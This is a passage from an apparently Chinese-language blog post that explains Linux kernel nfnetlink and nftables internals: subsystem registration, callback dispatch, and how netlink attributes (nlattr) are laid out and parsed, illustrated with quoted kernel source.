</span></span></code></pre></div><p>可见对每一种操作，在不同情况下，可以选用三种不同的调用方式。如此内核就可以根据用户的请求，调用不同的回调函数进行处理（后文会分析 <code>nftables</code> 注册的回调，来看看有哪些操作）。</p><p>用户会传入 <code>subsys_id</code> 告知内核要操作什么子系统，通过 <code>nfnl_dereference_protected</code> 宏函数就可以根据这个 id 找到具体的 <code>nfnetlink_subsystem</code> 结构体。</p><h5 id=通过-nfnl-dereference-protected-搜索>通过 nfnl_dereference_protected 搜索</h5><p><a id=code-snippet--nfnl-dereference-protected></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define nfnl_dereference_protected(id) \
</span></span></span><span style=display:flex><span><span style=color:#007020>        rcu_dereference_protected(table[(id)].subsys, \
</span></span></span><span style=display:flex><span><span style=color:#007020>                                  lockdep_nfnl_is_held((id)))
</span></span></span></code></pre></div><p>可见所有的结构体都聚合在了一个 <code>table</code> 变量中</p><p><a id=code-snippet--table></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>struct</span> {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> mutex				mutex;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnetlink_subsystem __rcu	<span style=color:#666>*</span>subsys;
</span></span><span style=display:flex><span>} table[NFNL_SUBSYS_COUNT];
</span></span></code></pre></div><p>这个 table 存储了所有类型的 <code>netfilter</code> 子系统定义。通过 <code>nfnetlink_subsys_register</code> 和 <code>nfnetlink_subsys_unregister</code> 就可以向表中注册和注销子系统。我们感兴趣的是 <code>nftables</code> ，这个模块的注册过程中就会向 <code>nfnetlink</code> 注册子系统</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> __init <span style=color:#06287e>nf_tables_module_init</span>(<span style=color:#902000>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>/* must be last */</span>
</span></span><span style=display:flex><span>  err <span style=color:#666>=</span> <span style=color:#06287e>nfnetlink_subsys_register</span>(<span style=color:#666>&amp;</span>nf_tables_subsys);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>goto</span> err6;
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
</span></span></code></pre></div><h5 id=nftables-子系统>nftables 子系统</h5><p>由此我们可以找到 <code>nftables</code> 子系统的定义，如下</p><p><a id=code-snippet--nf-tables-subsys></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnetlink_subsystem nf_tables_subsys <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>        .name		<span style=color:#666>=</span> <span style=color:#4070a0>&#34;nf_tables&#34;</span>,
</span></span><span style=display:flex><span>        .subsys_id	<span style=color:#666>=</span> NFNL_SUBSYS_NFTABLES,
</span></span><span style=display:flex><span>        .cb_count	<span style=color:#666>=</span> NFT_MSG_MAX,
</span></span><span style=display:flex><span>        .cb		<span style=color:#666>=</span> nf_tables_cb,
</span></span><span style=display:flex><span>        .commit		<span style=color:#666>=</span> nf_tables_commit,
</span></span><span style=display:flex><span>        .abort		<span style=color:#666>=</span> nf_tables_abort,
</span></span><span style=display:flex><span>        .cleanup	<span style=color:#666>=</span> nf_tables_cleanup,
</span></span><span style=display:flex><span>        .valid_genid	<span style=color:#666>=</span> nf_tables_valid_genid,
</span></span><span style=display:flex><span>        .owner		<span style=color:#666>=</span> THIS_MODULE,
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>这里面的 <code>nf_tables_cb</code> 存储了 <code>nftables</code> 模块的各种可行操作。</p><p><a id=code-snippet--nf-tables-cb></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnl_callback nf_tables_cb[NFT_MSG_MAX] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>        [NFT_MSG_NEWTABLE] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>                .call_batch	<span style=color:#666>=</span> nf_tables_newtable,
</span></span><span style=display:flex><span>                .attr_count	<span style=color:#666>=</span> NFTA_TABLE_MAX,
</span></span><span style=display:flex><span>                .policy		<span style=color:#666>=</span> nft_table_policy,
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        [NFT_MSG_GETTABLE] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>                .call_rcu	<span style=color:#666>=</span> nf_tables_gettable,
</span></span><span style=display:flex><span>                .attr_count	<span style=color:#666>=</span> NFTA_TABLE_MAX,
</span></span><span style=display:flex><span>                .policy		<span style=color:#666>=</span> nft_table_policy,
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        [NFT_MSG_DELTABLE] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>                .call_batch	<span style=color:#666>=</span> nf_tables_deltable,
</span></span><span style=display:flex><span>                .attr_count	<span style=color:#666>=</span> NFTA_TABLE_MAX,
</span></span><span style=display:flex><span>                .policy		<span style=color:#666>=</span> nft_table_policy,
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        [NFT_MSG_NEWCHAIN] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>                .call_batch	<span style=color:#666>=</span> nf_tables_newchain,
</span></span><span style=display:flex><span>                .attr_count	<span style=color:#666>=</span> NFTA_CHAIN_MAX,
</span></span><span style=display:flex><span>                .policy		<span style=color:#666>=</span> nft_chain_policy,
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
</span></span></code></pre></div><p><code>nftables</code> 支持的操作很多，所以这里只列出其中的几个。从上面的数组索引就可以看出它支持对 table 的增删查功能。</p><p>支持的所有功能是一组枚举：</p><p><a id=code-snippet--nf-tables-msg-types></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>enum</span> nf_tables_msg_types {
</span></span><span style=display:flex><span>        NFT_MSG_NEWTABLE,
</span></span><span style=display:flex><span>        NFT_MSG_GETTABLE,
</span></span><span style=display:flex><span>        NFT_MSG_DELTABLE,
</span></span><span style=display:flex><span>        NFT_MSG_NEWCHAIN,
</span></span><span style=display:flex><span>        NFT_MSG_GETCHAIN,
</span></span><span style=display:flex><span>        NFT_MSG_DELCHAIN,
</span></span><span style=display:flex><span>        NFT_MSG_NEWRULE,
</span></span><span style=display:flex><span>        NFT_MSG_GETRULE,
</span></span><span style=display:flex><span>        NFT_MSG_DELRULE,
</span></span><span style=display:flex><span>        NFT_MSG_NEWSET,
</span></span><span style=display:flex><span>        NFT_MSG_GETSET,
</span></span><span style=display:flex><span>        NFT_MSG_DELSET,
</span></span><span style=display:flex><span>        NFT_MSG_NEWSETELEM,
</span></span><span style=display:flex><span>        NFT_MSG_GETSETELEM,
</span></span><span style=display:flex><span>        NFT_MSG_DELSETELEM,
</span></span><span style=display:flex><span>        NFT_MSG_NEWGEN,
</span></span><span style=display:flex><span>        NFT_MSG_GETGEN,
</span></span><span style=display:flex><span>        NFT_MSG_TRACE,
</span></span><span style=display:flex><span>        NFT_MSG_NEWOBJ,
</span></span><span style=display:flex><span>        NFT_MSG_GETOBJ,
</span></span><span style=display:flex><span>        NFT_MSG_DELOBJ,
</span></span><span style=display:flex><span>        NFT_MSG_GETOBJ_RESET,
</span></span><span style=display:flex><span>        NFT_MSG_NEWFLOWTABLE,
</span></span><span style=display:flex><span>        NFT_MSG_GETFLOWTABLE,
</span></span><span style=display:flex><span>        NFT_MSG_DELFLOWTABLE,
</span></span><span style=display:flex><span>        NFT_MSG_MAX,
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h4 id=操作调用><span class=section-num>2.2.2</span> 操作调用</h4><p>通过上面的操作，我们成功找到了想要调用的子系统的结构体，接下来就是查找用户想要的操作的回调函数了，这是通过 <code>nfnetlink_find_client</code> 实现的</p><p><a id=code-snippet--nfnetlink-find-client></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnl_callback <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#06287e>nfnetlink_find_client</span>(u16 type, <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnetlink_subsystem <span style=color:#666>*</span>ss)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        u8 cb_id <span style=color:#666>=</span> <span style=color:#06287e>NFNL_MSG_TYPE</span>(type);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (cb_id <span style=color:#666>&gt;=</span> ss<span style=color:#666>-&gt;</span>cb_count)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>&amp;</span>ss<span style=color:#666>-&gt;</span>cb[cb_id];
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>type 由用户传入，在这里面，保存了 subsys_id 和 cb_id 两个 id ，通过两个宏即可提取出二者</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_ID(x)	((x &amp; 0xff00) &gt;&gt; 8)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_MSG_TYPE(x)	(x &amp; 0x00ff)
</span></span></span></code></pre></div><p>获取了 cb_id 后就可以从子系统注册的回调函数数组中取出函数了。经过数据处理和一些合法性检查就可以调用回调了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>err <span style=color:#666>=</span> <span style=color:#06287e>nla_parse_deprecated</span>(cda,
</span></span><span style=display:flex><span>                           ss<span style=color:#666>-&gt;</span>cb[cb_id].attr_count,
</span></span><span style=display:flex><span>                           attr, attrlen,
</span></span><span style=display:flex><span>                           ss<span style=color:#666>-&gt;</span>cb[cb_id].policy, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>goto</span> ack;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (nc<span style=color:#666>-&gt;</span>call_batch) {
</span></span><span style=display:flex><span>  err <span style=color:#666>=</span> nc<span style=color:#666>-&gt;</span><span style=color:#06287e>call_batch</span>(net, net<span style=color:#666>-&gt;</span>nfnl, skb, nlh,
</span></span><span style=display:flex><span>                       (<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>**</span>)cda,
</span></span><span style=display:flex><span>                       <span style=color:#666>&amp;</span>extack);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// ...
</span></span></span></code></pre></div><h2 id=nftables-中的一些结构体><span class=section-num>3</span> nftables 中的一些结构体</h2><h3 id=nlattr><span class=section-num>3.1</span> <code>nlattr</code></h3><p><code>nlattr</code> 是 <b>n</b>et<b>f</b>ilter <b>attr</b>ibute 的意思。是 netlink 中的一个“泛型”结构体，可以用来表示各种各样的数据类型</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr {
</span></span><span style=display:flex><span>        __u16           nla_len;
</span></span><span style=display:flex><span>        __u16           nla_type;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>它由上面结构体中定义的 header 加后部的 payload 组成（未在结构体中定义）</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> &lt;------- NLA_HDRLEN ------&gt; &lt;-- NLA_ALIGN(payload)--&gt;
</span></span><span style=display:flex><span>+---------------------+- - -+- - - - - - - - - -+- - -+
</span></span><span style=display:flex><span>|        Header       | Pad |     Payload       | Pad |
</span></span><span style=display:flex><span>|   (struct nlattr)   | ing |                   | ing |
</span></span><span style=display:flex><span>+---------------------+- - -+- - - - - - - - - -+- - -+
</span></span><span style=display:flex><span> &lt;-------------- nlattr.nla_len ---------------&gt;
</span></span></code></pre></div><p><code>nlattr</code> 的 header 通过 <code>NLA_HDRLEN</code> 对齐，和 payload 一样最后都由 <code>NLA_ALIGN</code> 宏对齐，都是 4 字节对齐</p><p><a id=code-snippet--HLA-HDRLEN></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define NLA_ALIGNTO		4
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NLA_ALIGN(len)		(((len) + NLA_ALIGNTO - 1) &amp; ~(NLA_ALIGNTO - 1))
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NLA_HDRLEN		((int) NLA_ALIGN(sizeof(struct nlattr)))
</span></span></span></code></pre></div><p>上面说 <code>nlattr</code> 可以用来表示各种数据类型，这是通过 <code>nla_type</code> 字段实现的，源码中的注释如下</p><p><a id="code-snippet--nla-type comment"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/*
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_type (16 bits)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * +---+---+-------------------------------+
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * | N | O | Attribute Type                |
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * +---+---+-------------------------------+
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * N := Carries nested attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * O := Payload stored in network byte order
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Note: The N and O flag are mutually exclusive.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span></code></pre></div><p>有相应的 mask 来辅助取出和设置这些字段</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define NLA_F_NESTED		(1 &lt;&lt; 15)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NLA_F_NET_BYTEORDER	(1 &lt;&lt; 14)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NLA_TYPE_MASK		~(NLA_F_NESTED | NLA_F_NET_BYTEORDER)
</span></span></span></code></pre></div><p>内核提供了一些辅助函数来操作 <code>nlattr</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_type - attribute type
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>int</span> <span style=color:#06287e>nla_type</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> nla<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>&amp;</span> NLA_TYPE_MASK;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_data - head of payload
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>void</span> <span style=color:#666>*</span><span style=color:#06287e>nla_data</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>char</span> <span style=color:#666>*</span>) nla <span style=color:#666>+</span> NLA_HDRLEN;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_len - length of payload
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>int</span> <span style=color:#06287e>nla_len</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> nla<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>-</span> NLA_HDRLEN;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>nlattr</code> 可以说是 nftables 中许多复杂数据结构的“序列化表示”，可以用于网络传输，而这些数据类型在内核中的表示则可能多种多样。接下来我们以 <code>nft_set_add_elem</code> 这个函数中对 <code>nft_data_init</code> 调用为例来看 <code>nlattr</code> 是如何一步步被转成 <code>nft_data</code> 的。</p><h4 id=parse-of-the-stream-of-attribute><span class=section-num>3.1.1</span> parse of the &ldquo;stream of attribute&rdquo;</h4><p>首先是对 netlink 数据包的解析，数据包中的数据被称为“属性流”（stream of attribute），它是一个 <code>nlattr</code> ，但是是嵌套的——即其数据部分存储的还是一串 <code>nlattr</code> ，也就是一些“序列化”的 <code>nlattr</code> （这是我编的，其实只是每个 <code>nlattr</code> 拼在一起组成一个 <code>data</code> 部分），此函数中使用 <code>nla_parse_nested_deprecated</code> 函数来解析属性流，这个函数将要被 parse 的 <code>nlattr</code> 的 data 部分取出并指定合法的 <code>__nla_type</code> 范围</p><p><a id=code-snippet--nla-parse-nested-deprecated></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_parse_nested_deprecated - parse nested attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @tb: destination array with maxtype+1 elements
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @maxtype: maximum attribute type to be expected
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: attribute containing the nested attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @policy: validation policy
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @extack: extended ACK report struct
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * See nla_parse_deprecated()
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>int</span> <span style=color:#06287e>nla_parse_nested_deprecated</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>tb[], <span style=color:#902000>int</span> maxtype,
</span></span><span style=display:flex><span>                                              <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla,
</span></span><span style=display:flex><span>                                              <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nla_policy <span style=color:#666>*</span>policy,
</span></span><span style=display:flex><span>                                              <span style=color:#007020;font-weight:700>struct</span> netlink_ext_ack <span style=color:#666>*</span>extack)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>__nla_parse</span>(tb, maxtype, <span style=color:#06287e>nla_data</span>(nla), <span style=color:#06287e>nla_len</span>(nla), policy,
</span></span><span style=display:flex><span>                           NL_VALIDATE_LIBERAL, extack);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><a id=code-snippet--nla-parse></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * __nla_parse - Parse a stream of attributes into a tb buffer
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @tb: destination array with maxtype+1 elements
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @maxtype: maximum attribute type to be expected
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @head: head of attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @len: length of attribute stream
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @policy: validation policy
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @validate: validation strictness
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @extack: extended ACK pointer
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Parses a stream of attributes and stores a pointer to each attribute in
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * the tb array accessible via the attribute type.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Validation is controlled by the @validate parameter.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * Returns 0 on success or a negative error code.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>__nla_parse</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>**</span>tb, <span style=color:#902000>int</span> maxtype,
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>head, <span style=color:#902000>int</span> len,
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nla_policy <span style=color:#666>*</span>policy, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> validate,
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> netlink_ext_ack <span style=color:#666>*</span>extack)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>__nla_validate_parse</span>(head, len, maxtype, policy, validate,
</span></span><span style=display:flex><span>                                    extack, tb, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL</span>(__nla_parse);
</span></span></code></pre></div><p><code>__nla_parse</code> 又是 <code>__nla_validate_parse</code> 的 wrapper 。抛来错误处理不谈，这个函数的实现很简单，大致如下</p><p><a id="code-snippet--summary of --nla-validate-parse"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> <span style=color:#06287e>__nla_validate_parse</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>head, <span style=color:#902000>int</span> len, <span style=color:#902000>int</span> maxtype,
</span></span><span style=display:flex><span>                                <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nla_policy <span style=color:#666>*</span>policy,
</span></span><span style=display:flex><span>                                <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> validate,
</span></span><span style=display:flex><span>                                <span style=color:#007020;font-weight:700>struct</span> netlink_ext_ack <span style=color:#666>*</span>extack,
</span></span><span style=display:flex><span>                                <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>**</span>tb, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> depth)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> rem;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (tb)
</span></span><span style=display:flex><span>    <span style=color:#06287e>memset</span>(tb, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>) <span style=color:#666>*</span> (maxtype <span style=color:#666>+</span> <span style=color:#40a070>1</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>nla_for_each_attr</span>(nla, head, len, rem) {
</span></span><span style=display:flex><span>    u16 type <span style=color:#666>=</span> <span style=color:#06287e>nla_type</span>(nla);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (type <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#666>||</span> type <span style=color:#666>&gt;</span> maxtype) {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (validate <span style=color:#666>&amp;</span> NL_VALIDATE_MAXTYPE) {
</span></span><span style=display:flex><span>        <span style=color:#06287e>NL_SET_ERR_MSG_ATTR</span>(extack, nla,
</span></span><span style=display:flex><span>                            <span style=color:#4070a0>&#34;Unknown attribute type&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>continue</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (tb)
</span></span><span style=display:flex><span>      tb[type] <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>)nla;
